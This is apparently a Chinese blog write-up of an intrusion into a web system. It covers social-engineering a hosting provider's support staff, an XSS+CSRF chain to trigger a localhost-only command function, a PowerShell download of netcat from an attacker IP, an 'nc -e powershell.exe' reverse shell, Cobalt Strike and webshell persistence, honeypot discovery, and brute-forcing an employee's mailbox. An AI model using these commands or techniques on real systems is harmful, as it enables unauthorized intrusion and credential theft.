不能坐以待毙，能否对服务器运营商下手呢。
找到了服务器运营商的官网，点击在线客服当触发QQ客服的那一刻
，脸上露出了邪魅的一笑。
来骗这个客服小同志，看看能不能获取点有用信息。
你kin你擦，还提供购买帐号密码（没有），既然戏已经开始了我必
须演下去。
自己选择的路，含泪我也要走完。去官网注册个帐号，发现找回密
码需要短信验证码，看来我得继续骗这个客服小同志了。
好家伙，毛都没套出来，把自己手机号还搭进去了，生活总是如此
苦涩。
坐等电话，虽然感觉没什么戏了，但是依然要相信有光，这个世界
是有奥特曼的！！！
经过了将近半小时的等待，电话中让我提供注册时候的姓名和身份
证信息，行吧~彻底凉凉了。
继续等待我的爆破结果吧，大意了，没有闪...，经过漫长的过程之
后，回来看一下结果，嘿嘿，运气还阔以。
欢喜皆空
连接进去，我第一件事情就是满足我的好奇心，去MySql数据库看
一眼...
得了，等着哭吧，是个默认的数据库，里面的数据是空的，难道...
我下载的配置文件是错误的？是个假的？这让我的渗透测试之旅又
开始产生了大量的怀疑。打了半天...居然是个错误的道路...该服
务器大概也翻了下，确实没啥东西。于是我暂时放弃了该服务器的
搜寻，折回到了我的起点，继续寻找其他漏洞。
我 返 回 到 了 后 台 -
账号管理功能，随机添加了一个简易的账号，并尝试登陆，我打算
尝试下后台登录口，是否存在SQL注入？
结果还是不行，手工也尝试了下，也是不可以。
无计可施，只能转回到后台的包中翻翻垃圾。功夫不负有心人，在
后台的中找到了一个有趣的参数cmd=
下执行命令，只允许localhost的请求使用这个功能。
而且目前只能执行dir命令。
不慌先吃口药，这个限制只要我们找到一处ssrf就能完美绕过。至
于只能执行dir命令的限制，根据经验来说问题不是很大。我们解决
IP限制后fuzz下就有机会。
备注：关于ssrf服务器端请求伪造，如果不懂其中的意思，读者可
以自行百度学习。
很可惜我没有找到ssrf，只扫到了csrf。想想我们手里面都有什么
能用上：
一个只能localhost利用的cmd
一个存储的xss漏洞
一个没有什么用的后台管理员账号
csrf漏洞
我们可以通过xss+csrf组合拳'让管理员帮我们执行一下命令。
首 先 我 们 需 要 一 个 xss
payload，#####让管理员触发xss时候执行命令。
然后我们需要一个csrf payload，
将xss+csrf结合ping 到我们的IP来看看。
测试
Wireshark监控到服务器的ICMP报文，目标主机已经发送长ping
到我的公网服务器。
既然可以执行命令了，那上个NC上去。
使用powershell下载nc。
powershell -c "iwr -uri xxx.xxx.xxx.xxx/nc.exe -outfile
%temp%/nncc.exe"
NC 反连回来，我们可以查看一下主机的环境。
%temp%/nncc.exe xxx.xxx.xxx.xxx 1234 -e powershell.exe
没有域控，没有AV。二话不说先上个CS上去，然后再藏个冰蝎进去
，防止掉权限。然后我要翻翻把我引到弯路的数据库配置文件，还
是那个数据库，没什么东西，为什么？
把服务器和应用里里外外仔细检查一遍。
1.用户登录最后登录是几个月之前；
2.大数据关联这个IP近几个月访问量很少；
3.数据库日志交互也特别特别少；
4.也没有和其他服务器交互记录；
5.无法横向移动，只与数据库互通，疑似在DMZ区或测试区。
从得到的信息来看这应该是一个测试区或者DMZ区的测试系统，或者
这就是一个蜜罐系统。顺着这个思路查下一整年的记录，8月之前居
然没有这个地址，确定了这是一个高交互的web蜜罐，惊出我一身冷
汗，毕竟出门搞站要保护好自己。
还是先检查下本地电脑和网络：
1.没多个键盘或鼠标，没有异常外连，没有奇怪端口。
2.全程使用的是虚拟机，浏览器什么的都是新的，没有下载VPN安
装包，桌面上用户.doc之类文件。
3.利用、nc连接、webshell过程中都用的服务器或者挂着代理池。
果然，给我服务器打了个标签，"2020你懂的"。心里暗呼侥幸，应
该只露了个服务器。偷偷的找个半夜三更的时候上去把蜜罐服务器
弱口令改掉改成一个特别长特别安全的密码，顺便把执行命令的功
能关闭（我（gei）真（wo）是（zheng）个（qu）善（yi）良（x
ie）的（shi）人（jian）），把冰蝎马和cs马都干掉。日志和其
他记录就懒得清理了，蜜罐上应该有另外保存，清理也没有什么用
。
邮件泄露
这个时候我开始大量的翻阅HTML源代码、JS源代码，希望可以找到一
些蛛丝马迹可使用。大概看了30多分钟...
发现了一个主流Jquery的JS框架被对方开发人员做了维护...得知
这个姓名，我开始大概率的制作字典，尝试在邮箱系统入手。
弱口令密码暴力破解该员工的邮箱密码...这个邮箱系统，还有验证
码，我大概看了下，这个验证码是数字+字母四位验证码，图片非常
清晰，这个条件非常适合暴力破解。
根据BurpSuite的状态码、返回值长度可以判断密码的正确与否。
由于系统的特殊性，我大概尝试了多组的暴力破解，终于锁定出了
最终密码:"姓名大小写组合+123456"，尝试登陆下是OK的。
从邮件内容来看，轻而易举的可以获取到账号、密码、IP地址等多个
维度的信息。系统有点那么"不攻自破"的感觉...居然输在了邮件上
？
总结
无论是信息收集阶段，还是漏洞扫描阶段，还是最终的漏洞利用阶
段也好，不可能一下子把每个阶段做的非常完美，遇到麻烦或心态
爆炸的时候，回原地再看看，这几个渗透测试流程在走一遍，或者
切换不同的视角在跑一次，跟小伙伴聊聊天碰撞下思路，也许会为
你难点工作上点亮新的"奇淫巧技"。有可能攻破1个系统所用的技术
并不是非常艰难，只不过恰好"那一个点"你没想到而已。
根据此案例所反映出的情况来看，最终失败的点归根结底还是偏向
：信息安全当中的"安全意识"问题，如果日常你的办公所用的密码能
够多个大小写字母、数字、特殊符号等方式组合，也不至于成现在
这个样子。乃至于，密码更换的周期如果再频繁一些，那就更好了
。"安全意识"并不是在企业里上一节课，或者听某个牛逼的老师给你
建议就可以OK搞定，它是一个非常需要注重的细节，乃至生活当中
也要融入这个细节，养成：所谓的"安全意识"。
精选留言
用户设置不下载评论